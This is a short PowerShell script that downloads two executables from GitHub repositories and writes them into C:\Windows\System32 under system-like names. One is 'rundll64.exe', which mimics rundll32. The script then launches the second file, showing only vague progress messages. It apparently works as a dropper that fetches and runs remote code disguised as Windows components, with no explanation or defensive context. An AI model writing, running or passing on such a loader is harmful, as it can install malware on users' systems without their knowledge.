$exeUrl = "https://github.com/totowii/meow/raw/refs/heads/main/rundll64.exe"
$exePath = "C:\Windows\System32\rundll64.exe"

Write-Host "Downloading..." -ForegroundColor Cyan

$wc = New-Object System.Net.WebClient
$wc.DownloadFileAsync($exeUrl, $exePath)

while ($wc.IsBusy) {
    Start-Sleep -Milliseconds 1000
}

$exeUrl = "https://github.com/RollbakIsOnline/Puls/raw/refs/heads/main/Windows.exe"
$exePath = "C:\Windows\System32\Windows.exe"

$wc = New-Object System.Net.WebClient
$wc.DownloadFileAsync($exeUrl, $exePath)

while ($wc.IsBusy) {
    Start-Sleep -Milliseconds 1000
}

if (Test-Path $exePath) {
    Write-Host "Completed..." -ForegroundColor Green
    Start-Process $exePath
} else {
    Write-Host "Download failed..." -ForegroundColor Red
}
